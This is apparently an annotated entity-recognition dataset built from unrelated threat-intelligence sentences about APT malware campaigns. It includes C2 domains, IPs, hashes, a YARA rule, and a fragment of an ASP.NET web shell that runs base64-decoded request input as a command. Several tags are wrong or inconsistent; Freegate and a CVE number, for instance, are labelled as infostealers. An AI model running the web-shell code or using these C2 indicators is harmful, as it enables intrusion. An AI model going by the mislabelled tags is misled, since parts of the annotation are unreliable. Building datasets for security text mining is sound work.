attackers	O
spoofed	O
the	O
email	O
id	O
of	O
Hidrofersa	O
as	O
it	O
is	O
less	O
likely	O
to	O
trigger	O
any	O
suspicion	O
and	O
there	O
is	O
high	O
chance	O
of	O
recipients	O
opening	O
the	O
attachment	O
as	O
it	O
is	O
coming	O
from	O
a	O
trusted	O
equipment	O
manufacturer	O
(	O
Hidrofersa	O
)	O
.	O

imlang.phmail.org	O
silence.phdns01.com	B-url.unknown
May	O
21st	O
May	O
10th	O
May	O
22nd	O
March	O
9th	O
May	O
31st	O
May	O
18th	O
vtt.phdns01.com	B-url.unknown
cpnet.phmail.us	B-url.unknown
preter.epac.to	O
preter.epac.to	B-url.unknown
May	O
25th	O
May	O
24th	O
May	O
23rd	O
April	O
19th	O
May	O
31st	O
May	O
28th	O
199.193.66.51	B-ip.unknown
(	O
TTL	O
:	O
1800	O
)	O
199.193.66.51	O
(	O
TTL	O
:	O
1800	O
)	O
199.193.66.51	B-ip.unknown
(	O
TTL	O
:	O
1800	O
)	O
199.193.66.51	B-ip.unknown
(	O
TTL	O
:	O
1800	O
)	O
1.235.10.28	B-ip.unknown
(	O
TTL	O
:	O
113.160.44.154	B-ip.unknown
(	O
TTL	O
:	O
30	O
)	O
6939	O
-	O
HURRICANE	O
-	O
Hurricane	O
Electric	O
,	O
Inc	O
.	O

The	O
Freegate	B-malware.infosteal
website	O
is	O
blocked	O
in	O
China	O
(	O
its	O
primary	O
target	O
market	O
)	O
,	O
as	O
is	O
the	O
case	O
with	O
other	O
similar	O
circumvention	O
tools	O
.	O

Several	O
indicators	O
point	O
towards	O
the	O
same	O
attackers	O
as	O
were	O
detailed	O
in	O
the	O
Norman	O
Shark	O
(	O
now	O
part	O
of	O
Blue	O
Coat	O
Systems	O
)	O
Hangover	O
report	O
from	O
last	O
year	O
.	O

It	O
uses	O
the	O
Sample	O
Grabber	O
filter	O
(	O
part	O
of	O
the	O
DirectShow	O
technology	O
in	O
Windows	O
)	O
to	O
directly	O
perform	O
grabbing	O
.	O

This	O
phase	O
will	O
often	O
leverage	O
a	O
specialized	O
tool	O
that	O
automatically	O
collects	O
a	O
wide	O
array	O
of	O
information	O
including	O
credentials	O
,	O
group	O
management	O
policies	O
,	O
and	O
even	O
system	O
logs	O
to	O
better	O
hone	O
further	O
attacks	O
and	O
assure	O
execution	O
of	O
their	O
malware	O
.	O

Mimikatz	B-malware.unknown
comes	O
in	O
a	O
self-extracted	O
7zip	O
archive	O
also	O
and	O
,	O
once	O
extracted	O
,	O
it	O
drops	O
four	O
distinct	O
fi	O
les	O
,	O
called	O
mimikatz.exe	B-malware.unknown
,	O
mimilib.dll	B-malware.unknown
,	O
mimidrv.sys	B-malware.unknown
,	O
and	O
pass.bat	B-malware.unknown
.	O

Figure	O
20	O
:	O
File	O
browsing	O
on	O
a	O
target	O
system	O
running	O
Linux	O

JRat	B-malware.backdoor
Controller	O
viewing	O
host	O
screen	O
Fig	O
5	O
.	O

The	O
C2	O
servers	O
we	O
can	O
see	O
are	O
shared	O
with	O
the	O
previous	O
variants	O
:	O
Below	O
,	O
we	O
will	O
present	O
evidence	O
that	O
we	O
have	O
obtained	O
regarding	O
the	O
attacker	O
and	O
the	O
associated	O
malware	O
.	O

This	O
includes	O
avoiding	O
clicking	O
on	O
links	O
or	O
downloading	O
any	O
documents	O
unless	O
certain	O
that	O
these	O
are	O
legitimate	O
.	O

.	O

Russian	O
Hackers	O
Leak	O
Simone	O
Biles	O
and	O
Serena	O
Williams	O
Files	O
.	O
'	O

For	O
instance	O
,	O
the	O
downloader	O
uses	O
the	O
CreateMutex	O
to	O
create	O
a	O
mutex	O
named	O
'	O
{	B-hash
53A4988C-F91F-4054-9076-220AC5EC03F3	I-hash
}	I-hash
'	O
to	O
determine	O
if	O
another	O
instance	O
of	O
the	O
code	O
is	O
running	O
.	O

As	O
you	O
can	O
see	O
,	O
when	O
compared	O
to	O
each	O
other	O
,	O
these	O
messages	O
appear	O
completely	O
unrelated	O
,	O
other	O
than	O
the	O
fact	O
they	O
both	O
contain	O
jar	O
files	O
that	O
are	O
sophomorically	O
'	O
obfuscated	O
'	O
as	O
pdf.jar	O
files	O
.	O

Ignorance	O
of	O
expected	O
process	O
state	O
facilitates	O
an	O
attacker	O
's	O
ability	O
to	O
achieve	O
physical	O
consequence	O
without	O
alarming	O
operators	O
.	O

In	O
addition	O
to	O
the	O
7/10	O
messages	O
,	O
the	O
attackers	O
created	O
messages	O
;	O
the	O
content	O
of	O
these	O
messages	O
was	O
syntactically	O
correct	O
but	O
the	O
values	O
in	O
specific	O
fields	O
were	O
wrong	O
.	O

June	O
9	O
,	O
2016	O
Figure	O
9	O
shows	O
how	O
these	O
encoded	O
strings	O
are	O
used	O
.	O

The	O
New	O
York	O
Times	O
.	O

The	O
malware	O
uses	O
encryption	O
in	O
an	O
attempt	O
to	O
disguise	O
harvested	O
data	O
in	O
the	O
.dat	O
files	O
intended	O
for	O
exfiltration	O
.	O

The	O
Committee	O
to	O
Protect	O
Journalists	O
(	O
CPJ	O
)	O
and	O
Human	O
Rights	O
Watch	O
have	O
both	O
criticized	O
this	O
action	O
,	O
CPJ	O
has	O
pointed	O
out	O
that	O
it	O
is	O
having	O
a	O
chilling	O
effect	O
on	O
legitimate	O
political	O
reporting	O
about	O
the	O
group	O
and	O
its	O
leadership	O
.	O

Appendix	O
D	O
:	O
Other	O
Collateral	O

The	O
primary	O
difference	O
being	O
that	O
the	O
attackers	O
opted	O
to	O
use	O
a	O
163.com	O
Blog	O
over	O
a	O
Google	O
Code	O
page	O
to	O
embed	O
the	O
command	O
.	O

Poseidon	B-malware.infosteal
continues	O
to	O
be	O
active	O
at	O
this	O
time	O
.	O

However	O
,	O
due	O
to	O
the	O
unique	O
functionality	O
of	O
malware	O
system	O
and	O
its	O
potential	O
for	O
employment	O
against	O
targets	O
beyond	O
the	O
initially	O
intended	O
victim	O
,	O
the	O
network	O
security	O
community	O
should	O
be	O
concerned	O
and	O
track	O
this	O
malware	O
closely	O
.	O

In	O
addition	O
,	O
this	O
was	O
the	O
original	O
registrant	O
for	O
C2	O
domain	O
used	O
in	O
our	O
Google	O
Code	O
blog	O
,	O
indicating	O
this	O
registrant	O
email	O
is	O
likely	O
a	O
re-seller	O
,	O
and/or	O
someone	O
who	O
initially	O
sets	O
up	O
infrastructure	O
for	O
particular	O
APT	B-malware.unknown
threat	O
actors	O
.	O

This	O
is	O
done	O
to	O
lower	O
the	O
target	O
's	O
suspicions	O
and	O
mask	O
the	O
true	O
functionality	O
of	O
the	O
executable	O
.	O

Implement	O
change	O
management	O
procedures	O
for	O
changes	O
to	O
key	O
position	O
.	O

This	O
implies	O
that	O
the	O
Lazarus	O
group	O
could	O
be	O
is	O
either	O
collecting	O
intelligence	O
about	O
targets	O
in	O
this	O
region	O
,	O
or	O
is	O
at	O
an	O
early	O
stage	O
of	O
planning	O
.	O

X-Get-Message-Sender-Via\	O
authenticated_id	O
X-AntiAbuse	O
User-Agent	O
Message	O
body	O
'	O
Milker	O
Trading	O
Ltd	O
'	O
<	O
rbecerra@pauluhn.com[.]mx	O
>	O
US	O
$	O
25,000	O
TT	O
COPY	O
ATTACHED	O
Wed	O
,	O
14	O
May	O
2014	O
03:28:43	O
-0500	O

The	O
product	O
information	O
in	O
the	O
builder	O
kit	O
matched	O
with	O
this	O
individual	O
's	O
YouTube	O
username	O
and	O
the	O
YouTube	O
channel	O
.	O

Accenture	O
is	O
a	O
leading	O
global	O
professional	O
services	O
company	O
,	O
providing	O
a	O
broad	O
range	O
of	O
services	O
and	O
solutions	O
in	O
strategy	O
,	O
consulting	O
,	O
digital	O
,	O
technology	O
and	O
operations	O
.	O

Unlike	O
zxFunction001	O
,	O
this	O
is	O
not	O
used	O
by	O
any	O
of	O
the	O
RAT	B-malware.drop
commands	O
in	O
the	O
zxshell.dll	B-malware.backdoor
.	O

Other	O
targets	O
identified	O
were	O
predominantly	O
located	O
in	O
Australia	O
,	O
New	O
Zealand	O
,	O
Vietnam	O
and	O
the	O
United	O
States	O
.	O

This	O
high	O
level	O
of	O
cyber-espionage	B-malware.infosteal
activity	O
goes	O
back	O
years	O
.	O

The	O
IRONGATE	B-malware.backdoor
droppers	O
are	O
Python	O
scripts	O
converted	O
to	O
executables	O
using	O
PyInstaller	O
.	O

3	O
.	O

With	O
this	O
goal	O
in	O
mind	O
,	O
researchers	O
tested	O
several	O
possible	O
ways	O
of	O
restoring	O
disk	O
data	O
critical	O
to	O
the	O
access	O
of	O
the	O
targeted	O
disk	O
's	O
file	O
system	O
.	O

The	O
main	O
part	O
of	O
'	O
Matryoshka	B-malware.unknown
'	O
is	O
a	O
remote	O
administration	O
tool	O
library	O
.	O

TOKEN_LOGIN	O
TOKEN_DRIVE_LIST	O
TOKEN_FILE_LIST	O
TOKEN_FIRST_SCREEN	O
TOKEN_AUDIO_DATA	O

Module	O
name	O
Commands	O

技术分享	O
(	O
2	O
)	O

Reference	O
linking	O
:	O

designates	O
a	O
volume	O
serial	O
number	O
infect	O
the	O
just	O
listed	O
identified	O
drive	O
designates	O
a	O
volume	O
serial	O
number	O

North	O
Korean	O
state-sponsored	O
actors	O
have	O
used	O
Hangul	O
exploits	O
(	O
CVE-2015-6585	B-malware.infosteal
)	O
and	O
malicious	O
.hwp	O
files	O
in	O
the	O
past	O
,	O
including	O
during	O
a	O
phishing	O
campaign	O
in	O
early	O
2017	O
,	O
to	O
target	O
South	O
Korean	O
users	O
.	O

(	O
SPC	O
)	O
Property	O
Right-Council	O
Avast	O
detected	O
the	O
attacks	O
originating	O
from	O
the	O
Korea	O
Software	O
website	O
(	O
http://www.spc.or.kr	B-url.normal
)	O
possibly	O
infected	O
via	O
the	O
phishing	O
email	O
sent	O
on	O
the	O
19th	O
.	O

Interesting	O
encrypted	O
resources	O

If	O
the	O
read	O
is	O
unsuccessful	O
,	O
the	O
function	O
returns	O
a	O
PacketHeader	O
/	O
PCCCMDPacketHeader	O
based	O
packet	O
with	O
the	O
set	O

3	O
)	O
After	O
the	O
Class_Terminate	O
return	O
,	O
the	O
memory	O
pointed	O
to	O
by	O
the	O
b	O
object	O
will	O
be	O
released	O
,	O
so	O
that	O
a	O
pointer	O
to	O
the	O
memory	O
data	O
of	O
the	O
released	O
object	O
b	O
is	O
obtained	O
.	O

4/12	O

Despite	O
this	O
,	O
however	O
,	O
the	O
toolset	O
itself	O
has	O
not	O
been	O
publicly	O
analyzed	O
.	O

Instead	O
of	O
using	O
government	O
or	O
telecommunications-related	O
documents	O
,	O
the	O
new	O
lure	O
document	O
presents	O
itself	O
as	O
a	O
reward	O
or	O
promotion	O
,	O
which	O
could	O
indicate	O
that	O
the	O
targets	O
are	O
no	O
longer	O
limited	O
to	O
specific	O
industries	O
or	O
organizations	O
.	O

It	O
's	O
rather	O
peculiar	O
why	O
the	O
threat	O
actor	O
re-used	O
the	O
same	O
domains	O
and	O
IPs	O
.	O

Operation	O
BugDrop	O
was	O
a	O
cyber-reconnaissance	O
mission	O
;	O
its	O
goal	O
was	O
to	O
gather	O
intelligence	O
about	O
targets	O
in	O
various	O
domains	O
including	O
critical	O
infrastructure	O
,	O
media	O
,	O
and	O
scientific	O
research	O
.	O

Through	O
the	O
exploitation	O
of	O
the	O
HTA	O
handler	O
vulnerability	O
described	O
in	O
CVE-2017-1099	O
,	O
the	O
observed	O
RTF	O
attachments	O
download	O
hxxp://tk-in-f156.2bunny[.]com/Agreement.doc	B-url.unknown
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

The	O
following	O
is	O
a	O
detailed	O
analysis	O
of	O
the	O
implementation	O
process	O
of	O
the	O
backdoor	O
program	O
.	O

A	O
closer	O
look	O
at	O
up.bat	O

Once	O
the	O
dropped	O
file	O
is	O
executed	O
it	O
copies	O
itself	O
into	O
%	O
AppData	O
%	O
\SQLite	O
directory	O
as	O
SQLite.exe	O
and	O
executes	O
as	O
shown	O
below	O
.	O

•	O
An	O
indirect	O
relationship	O
such	O
as	O
the	O
completion	O
of	O
a	O
common	O
training	O
regimen	O
.	O

2EB1503751A7C74890096B1837C7BD81	B-hash
menu.dyndns.biz	B-url.cncsvr

GetString	O
(	O
System.Convert.FromBase64String	O
(	O
Request.Item	O
[	O
'	O
z2	O
'	O
]	O
)	O
)	O
;	O
e.Start	O
(	O
)	O
;	O
out=e.StandardOutput;EI=e.StandardError;e.Close	O
(	O
)	O
;	O
Response.Write	O
(	O
out.ReadToEnd	O
(	O
)	O
+EI.ReadToEnd	O
(	O
)	O
)	O
;	O

Lazarus	O
Group	O
operations	O
target	O
a	O
wide	O
swath	O
of	O
countries	O
and	O
verticals	O
,	O
with	O
a	O
particular	O
interest	O
in	O
South	O
Korean	O
targets	O
.	O

All	O
rights	O
reserved	O
.	O

The	O
analysts	O
who	O
worked	O
this	O
case	O
now	O
understand	O
that	O
the	O
attackers	O
began	O
preparations	O
for	O
this	O
campaign	O
in	O
June	O
2014	O
,	O
a	O
full	O
eleven	O
months	O
ago	O
.	O

The	O
themes	O
--	O
or	O
topics—used	O
in	O
the	O
emails	O
from	O
the	O
DragonOK	B-malware.infosteal
group	O
were	O
well	O
crafted	O
and	O
highly	O
tailored	O
to	O
the	O
target	O
audience	O
.	O

The	O
malware	O
chooses	O
between	O
one	O
of	O
the	O
three	O
domains	O
from	O
the	O
configuration	O
and	O
adds	O
a	O
custom	O
sub-domain	O
generated	O
using	O
two	O
values	O
.	O

At	O
the	O
time	O
of	O
the	O
attack	O
,	O
these	O
backdoors	O
were	O
undetected	O
and	O
undocumented	O
by	O
any	O
security	O
vendor	O
.	O

In	O
addition	O
,	O
the	O
group	O
has	O
been	O
adding	O
anti	O
sandboxing	O
techniques	O
,	O
such	O
as	O
the	O
code	O
from	O
Pafish	O
described	O
above	O
and	O
anti-debugging	O
methods	O
:	O
This	O
anti-debugging	O
code	O
seems	O
to	O
have	O
been	O
copied	O
from	O
CodeProject	O
,	O
a	O
well-known	O
online	O
source	O
.	O

2BFE41D7FDB6F4C1E38DB4A5C3EB1211	B-hash
loading.myftp.org	B-url.cncsvr

The	O
request	O
is	O
sent	O
via	O
the	O
legitimate	O
application	O
curl.exe	O
that	O
gets	O
extracted	O
from	O
the	O
initial	O
7zip	O
archive	O
.	O

The	O
GnuMP	O
code	O
in	O
Dino	B-malware.backdoor
contains	O
file	O
paths	O
coming	O
from	O
the	O
developer	O
's	O
machine	O
:	O
..\..\src\arithmetique\mpn\mul.c	O
..\..\src\arithmetique\printf\doprnt.c	O
..\..\src\arithmetique\mpn\tdiv_qr.c	O
..\..\src\arithmetique\mpn\mul_fft.c	O
..\..\src\arithmetique\mpn\get_str.c	O
As	O
the	O
attentive	O
reader	O
has	O
probably	O
guessed	O
,	O
'	O
arithmetique	O
'	O
is	O
the	O
French	O
translation	O
of	O
'	O
arithmetic	O
'	O
.	O

The	O
main	O
loop	O
of	O
the	O
backdoor	O
has	O
two	O
main	O
functions	O
,	O
infoClient	O
and	O
runHandle.infoClient	O
is	O
reponsible	O
for	O
collecting	O
OS	O
info	O
,	O
submitting	O
this	O
info	O
to	O
its	O
C	O
&	O
C	O
servers	O
(	O
the	O
servers	O
are	O
malicious	O
in	O
nature	O
)	O
,	O
and	O
receiving	O
additional	O
C	O
&	O
C	O
communication	O
information	O
.	O

Backdoor	B-malware.backdoor
Activity	O

Instead	O
,	O
it	O
has	O
redoubled	O
its	O
efforts	O
,	O
adding	O
more	O
layers	O
of	O
obfuscation	O
to	O
an	O
already	O
complex	O
attack	O
framework	O
.	O

Some	O
of	O
these	O
may	O
be	O
included	O
in	O
order	O
to	O
help	O
the	O
attackers	O
to	O
try	O
and	O
identify	O
real	O
victims	O
vs	O
researchers/sandboxes/honeypots	O
.	O

The	O
following	O
factors	O
reveal	O
the	O
attackers	O
intention	O
to	O
remain	O
stealthy	O
and	O
the	O
attempt	O
to	O
evade	O
sandbox	O
analysis	O
,	O
manual	O
analysis	O
and	O
security	O
monitoring	O
at	O
both	O
the	O
desktop	O
and	O
network	O
levels	O
.	O

The	O
image	O
shown	O
to	O
the	O
victim	O
contains	O
pictures	O
of	O
members	O
of	O
the	O
Ginbot	O
7	O
Ethiopian	O
opposition	O
group	O

When	O
did	O
you	O
discover	O
this	O
targeted	O
attack	O
?	O

The	O
ransomware	O
then	O
recursively	O
deletes	O
all	O
backup	O
files	O
from	O
the	O
drives	O
C	O
:	O
,	O
D	O
:	O
,	O
E	O
:	O
,	O
F	O
:	O
,	O
G	O
:	O
,	O
and	O
H	O
:	O
,	O
having	O
the	O
following	O
extensions	O
:	O

Upon	O
starting	O
,	O
it	O
calls	O
the	O
runLoader	O
method	O
,	O
which	O
orchestrates	O
the	O
following	O
:	O
Checks	O
if	O
a	O
debugger	O
is	O
present	O
and	O
,	O
if	O
so	O
,	O
the	O
malware	O
exits	O
.	O

Inception	B-malware.backdoor
's	O
malware	O
is	O
modular	O
and	O
the	O
attackers	O
will	O
load	O
plugins	O
based	O
on	O
requirements	O
for	O
each	O
attack	O
.	O

For	O
example	O
,	O
for	O
years	O
we	O
saw	O
repeated	O
use	O
of	O
spearphishing	O
targets	O
directly	O
with	O
.hta	O
files	O
.	O

9	O
,	O
2018	O
,	O
3:56	O
a.m.	O
)	O

Kindly	O
check	O
and	O
confirm	O
to	O
me	O
the	O
date	O
of	O
dispatch	O
of	O
our	O
last	O
order	O
.	O

Headquartered	O
in	O
Mountain	O
View	O
,	O
Calif.	O
,	O
Symantec	O
has	O
operations	O
in	O
40	O
countries	O
.	O

When	O
run	O
,	O
the	O
malware	O
decrypts	O
the	O
contents	O
of	O
its	O
configuration	O
file	O
,	O
using	O
the	O
RC4	O
key	O
:	O

Prior	O
to	O
the	O
outbreak	O
,	O
the	O
Telebots	O
group	O
targeted	O
mainly	O
the	O
financial	O
sector	O
.	O

(	O
Note	O
:	O
The	O
encryption	O
is	O
used	O
to	O
encrypt	O
commands	O
stored	O
in	O
a	O
file	O
on	O
the	O
local	O
system	O
.	O
)	O

A	O
new	O
service	O
is	O
then	O
created	O
using	O
the	O
service	O
parser	O
function	O
ProcessScCommand	O
.	O

This	O
vulnerability	O
is	O
for	O
the	O
Ghostscript	O
suite	O
and	O
affects	O
a	O
wide	O
range	O
of	O
products	O
,	O
and	O
while	O
this	O
particular	O
version	O
is	O
triggered	O
from	O
within	O
an	O
embedded	O
PostScript	O
in	O
an	O
HWP	O
document	O
,	O
it	O
could	O
easily	O
be	O
adapted	O
to	O
other	O
software	O
.	O

Using	O
Windows	O
CryptoAPI	O
platform	O
,	O
the	O
malware	O
creates	O
an	O
exchange	O
key	O
pair	O
,	O
and	O
then	O
exports	O
the	O
2,048-bit	O
public	O
RSA	O
key	O
into	O
an	O
external	O
file	O
called	O
PUBLIC	O
.	O

Like	O
the	O
ATD	O
website	O
,	O
at	O
the	O
time	O
of	O
this	O
writing	O
the	O
DPHK	O
websites	O
are	O
also	O
serving	O
up	O
malicious	O
code	O
,	O
so	O
please	O
browse	O
with	O
caution	O
.	O

Mining	O
our	O
database	O
we	O
found	O
three	O
versions	O
of	O
this	O
malware	O
and	O
they	O
are	O
noted	O
in	O
the	O
table	O
below	O
.	O

exe	O
:	O
Reflectively	O
injects	O
a	O
DLL	O
downloaded	O
from	O
a	O
specific	O
URL	O
In	O
addition	O
to	O
the	O
backdoor	O
's	O
modus	O
operandi	O
,	O
the	O
attackers	O
will	O
use	O
a	O
Microsoft	O
WMI	O
commandline	O
tool	O
to	O
list	O
the	O
compromised	O
system	O
's	O
running	O
processes	O
,	O
which	O
are	O
sent	O
to	O
the	O
C	O
&	O
C	O
server	O
:	O

The	O
malware	O
is	O
also	O
capable	O
of	O
detecting	O
anti-virus	O
software	O
.	O

The	O
one	O
outlier	O
was	O
written	O
as	O
winword.exe	O
.	O

92643bfa4121f1960c43c78a3d53568b	B-hash

hash1	O
=	O
'	O
75d3d1f23628122a64a2f1b7ef33f5cf	B-hash
'	O
hash2	O
=	O
'	O
d9821468315ccd3b9ea03161566ef18e	B-hash
'	O
hash3	O
=	O
'	O
b9af5f5fd434a65d7aa1b55f5441c90a	B-hash
'	O
meta	O
:	O
strings	O
:	O
//	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.3	O
;	O
WOW64	O
;	O
Trident/7.0;rv:11.0	O
)	O
like	O
Gecko	O
$	O
=	O
{	O
c7	O
64	O
00	O
63	O
00	O
c7	O
69	O
00	O
62	O
00	O
c7	O
7a	O
00	O
7e	O
00	O
c7	O
2d	O
00	O
43	O
00	O
c7	O
59	O
00	O
2d	O
00	O
c7	O
3b	O
00	O
23	O
00	O
c7	O
3e	O
00	O
36	O
00	O
c7	O
2d	O
00	O
5a	O
00	O
c7	O
42	O
00	O
5a	O
00	O
c7	O
3b	O
00	O
39	O
00	O
c7	O
36	O
00	O
2d	O
00	O
c7	O
59	O
00	O
7f	O
00	O
c7	O
64	O
00	O
69	O
00	O
c7	O
68	O
00	O
63	O
00	O
c7	O
79	O
00	O
22	O
00	O
c7	O
3a	O
00	O
23	O
00	O
c7	O
3d	O
00	O
36	O
00	O
c7	O
2d	O
00	O
7f	O
00	O
c7	O
7b	O
00	O
37	O
00	O
c7	O
3c	O
00	O
3c	O
00	O
c7	O
23	O
00	O
3d	O
00	O
c7	O
24	O
00	O
2d	O
00	O
c7	O
61	O
00	O
64	O
00	O
c7	O
66	O
00	O
68	O
00	O
c7	O
2d	O
00	O
4a	O
00	O
c7	O
68	O
00	O
6e	O
00	O
c7	O
66	O
00	O
62	O
00	O
}	O
//	O
offset	O
10001566	O
//	O
Software\Microsoft\Windows\CurrentVersion\Run	O
$	O
=	O
{	O
c7	O
23	O
00	O
24	O
00	O
c7	O
24	O
00	O
33	O
00	O
c7	O
38	O
00	O
22	O
00	O
c7	O
00	O
00	O
33	O
00	O
c7	O
24	O
00	O
25	O
00	O
c7	O
3f	O
00	O
39	O
00	O
c7	O
38	O
00	O
0a	O
00	O
c7	O
04	O
00	O
23	O
00	O
c7	O
38	O
00	O
00	O
00	O
c7	O
43	O
00	O
66	O
00	O
c7	O
6d	O
00	O
60	O
00	O
c7	O
67	O
00	O
52	O
00	O
c7	O
6e	O
00	O
63	O
00	O
c7	O
7b	O
00	O
67	O
00	O
c7	O
70	O
00	O
00	O
00	O
c7	O
43	O
00	O
4d	O
00	O
c7	O
44	O
00	O
00	O
00	O
c7	O
0f	O
00	O
43	O
00	O
c7	O
00	O
00	O
50	O
00	O
c7	O
49	O
00	O
4e	O
00	O
c7	O
47	O
00	O
00	O
00	O
c7	O
11	O
00	O
12	O
00	O
c7	O
17	O
00	O
0e	O
00	O
c7	O
10	O
00	O
0e	O
00	O
c7	O
10	O
00	O
0e	O
00	O
c7	O
11	O
00	O
06	O
00	O
c7	O
44	O
00	O
45	O
00	O
c7	O
4c	O
00	O
00	O
00	O
}	O
//	O
10003D09	O
$	O
=	O
{	O
66	O
[	O
4-7	O
]	O
0d	O
40	O
83	O
f8	O
44	O
7c	O
?	O
?	O
}	O

This	O
is	O
not	O
the	O
first	O
time	O
that	O
malicious	O
installer	O
packages	O
have	O
been	O
created	O
for	O
circumvention	O
tools	O
.	O

192.168.131.65:1213	O
-	O
>	O
77.69.140.194:443	O
1270075	O
bytes	O
192.168.131.65:4111	O
-	O
>	O
77.69.149.194:4111	O
4766223	O
bytes	O

The	O
WMI	O
request	O
simply	O
replies	O
'	O
not	O
supported	O
'	O
.	O

In	O
all	O
likelihood	O
this	O
relates	O
to	O
a	O
series	O
of	O
blogs	O
byFireEye	O
which	O
refer	O
to	O
a	O
series	O
of	O
web	O
compromises	O
in	O
2013	O
as	O
being	O
the	O
SunShop	O
campaign	O
.	O

It	O
appears	O
that	O
sample	O
#	O
6	O
was	O
actually	O
obtained	O
by	O
packing	O
sample	O
#	O
4	O
with	O
Themida	O
(	O
potentially	O
,	O
to	O
avoid	O
detection	O
)	O
,	O
as	O
code/data	O
found	O
in	O
both	O
samples	O
is	O
identical	O
.	O

The	O
contents	O
of	O
'	O
Windows.reg	O
'	O
is	O
populated	O
based	O
on	O
the	O
Operating	O
System	O
(	O
OS	O
)	O
which	O
is	O
determined	O
by	O
a	O
call	O
to	O
the	O
GetVersionEx	O
API	O
.	O

Figure	O
4	O
:	O
Decoded	O
ZLIB	O
+	O
Base64	O
payload	O
The	O
shellcode	O
invokes	O
PowerShell	O
to	O
issue	O
a	O
HTTP	O
GET	O
request	O
for	O
a	O
random	O
four	O
(	O
4	O
)	O
character	O
URI	O
on	O
the	O
root	O
of	O
autodiscovery[.]2bunny[.]com	B-url.unknown
.	O

The	O
malware	O
later	O
reads	O
that	O
data	O
and	O
appends	O
it	O
to	O
content	O
of	O
the	O
file	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBoledvbs.inc	O
.	O

ChessMaster	O
's	O
current	O
iteration	O
starts	O
off	O
with	O
the	O
familiar	O
phishing	O
attacks	O
seen	O
in	O
the	O
earlier	O
campaigns	O
that	O
involved	O
the	O
use	O
of	O
an	O
email	O
with	O
an	O
attached	O
malicious	O
document	O
using	O
the	O
doc	O
,	O
docx	O
,	O
rtf	O
,	O
csv	O
and	O
msg	O
formats	O
.	O

There	O
are	O
four	O
commands	O
that	O
supports	O
:	O
Activate	O
the	O
remote	O
shell	O
Execute	O
the	O
specified	O
file	O
Send	O
input	O
to	O
remote	O
shell	O
Terminate	O
the	O
remote	O
shell	O
For	O
each	O
of	O
the	O
commands	O
,	O
any	O
output	O
from	O
or	O
acknowledgement	O
of	O
the	O
commands	O
comes	O
in	O
the	O
form	O
of	O
another	O
packet	O
consisting	O
of	O
a	O
PacketHeader	O
followed	O
by	O
a	O

5	O
.	O

The	O
file	O
was	O
created	O
in	O
a	O
newer	O
version	O
of	O
Microsoft	O
Office	O
programs	O
.	O

Our	O
analysis	O
revealed	O
that	O
it	O
has	O
extra	O
features	O
,	O
such	O
as	O
downloading	O
and	O
uploading	O
fi	O
les	O
on	O
remote	O
infected	O
systems	O
,	O
as	O
well	O
as	O
information	O
harvesting	O
.	O

The	O
VBR	O
placement	O
for	O
the	O
next	O
partition	O
starts	O
after	O
the	O
backup	O
VBR	O
of	O
the	O
preceding	O
partition	O
.	O

The	O
latest	O
version	O
of	O
GravityRAT	B-malware.drop
was	O
created	O
in	O
December	O
2017	O
named	O
GX	O
.	O

Once	O
secured	O
,	O
the	O
malware	O
communicates	O
,	O
by	O
default	O
,	O
with	O
a	O
primary	O
hardcoded	O
command	O
and	O
control	O
website	O
that	O
varies	O
in	O
different	O
samples	O
(	O
spgbotup[.]club	O
)	O
.	O

23	O
.	O

The	O
string	O
CSW	O
is	O
a	O
name	O
for	O
logical	O
nodes	O
,	O
which	O
are	O
used	O
to	O
control	O
circuit	O
breakers	O
and	O
switches	O
For	O
variables	O
that	O
contain	O
the	O
Model	O
or	O
stVal	O
string	O
the	O
61850	O
payload	O
sends	O
an	O
additional	O
MMS	O
request	O
For	O
some	O
of	O
the	O
variables	O
this	O
component	O
may	O
also	O
issue	O
an	O
MMS	O
request	O
that	O
will	O
change	O
its	O
state	O
The	O
61850	O
payload	O
produces	O
a	O
log	O
file	O
of	O
its	O
operations	O
that	O
contains	O
the	O
IP	O
addresses	O
,	O
MMS	O
domains	O
,	O
named	O
variables	O
and	O
the	O
node	O
states	O
(	O
open	O
or	O
closed	O
)	O
of	O
its	O
targets	O
The	O
OPC	O
DA	O
payload	O
component	O
implements	O
a	O
client	O
for	O
the	O
protocol	O
described	O
in	O
the	O
OPC	O
Data	O
Access	O
specification	O
OPC	O
(	O
OLE	O
for	O
Process	O
Control	O
)	O
is	O
a	O
software	O
standard	O
and	O
specification	O
that	O
is	O
based	O
on	O
Microsoft	O
technologies	O
such	O
as	O
OLE	O
,	O
COM	O
,	O
and	O
DCOM	O
The	O
Data	O
Access	O
(	O
DA	O
)	O
part	O
of	O
the	O
OPC	O
specification	O
allows	O
real-time	O
data	O
exchange	O
between	O
distributed	O
components	O
,	O
based	O
on	O
a	O
client–server	O
model	O
This	O
component	O
exists	O
as	O
a	O
standalone	O
malicious	O
tool	O
with	O
the	O
filename	O
and	O
a	O
DLL	O
,	O
which	O
implement	O
both	O
61850	O
and	O
OPC	O
DA	O
payload	O
functionalities	O
This	O
DLL	O
is	O
named	O
,	O
internally	O
in	O
PE	O
export	O
table	O
,	O
,	O
suggesting	O
that	O
the	O
code	O
of	O
this	O
component	O
may	O
be	O
based	O
on	O
the	O
open	O
source	O
project	O
OPC	O
Client	O

금융사	O
노조의	O
홈페이지를	O
통해	O
악성코드를	O
유포하	O
거나	O
금융	O
기관에서	O
사용되는	O
시스템의	O
취약점을	O
이용해	O
공격을	O
시도했다	O
.	O

All	O
rights	O
reserved	O
.	O

Specifically	O
,	O
the	O
following	O
aspects	O
of	O
this	O
campaign	O
remind	O
us	O
of	O
existing	O
write­	O
ups	O
on	O
Middle	O
Eastern	O
campaigns	O
:	O
it	O
's	O
unclear	O
why	O
there	O
is	O
a	O
preference	O
for	O
this	O
,	O
however	O
in	O
several	O
'	O
how­to	O
'	O
videos	O
on	O
Arabic	O
language	O
underground	O
forums	O
the	O
video	O
creators	O
recommend	O
using	O
no­ip.com	O
as	O
opposed	O
to	O
other	O
dynamic	O
DNS	O
providers	O
;	O
many	O
groups	O
operating	O
in	O
the	O
Middle	O
East	O
use	O
malware	O
families	O
(	O
such	O
as	O
Poison	O
Ivy/Xtreme	O
RAT	O
)	O
which	O
are	O
publically	O
available	O
rather	O
than	O
developing	O
their	O
own	O
binaries	O
;	O
the	O
targeting	O
seems	O
entirely	O
restricted	O
to	O
Middle	O
Eastern	O
issues	O
and	O
,	O
whilst	O
there	O
appears	O
to	O
be	O
a	O
heavy	O
focus	O
on	O
Israel	O
in	O
the	O
decoy	O
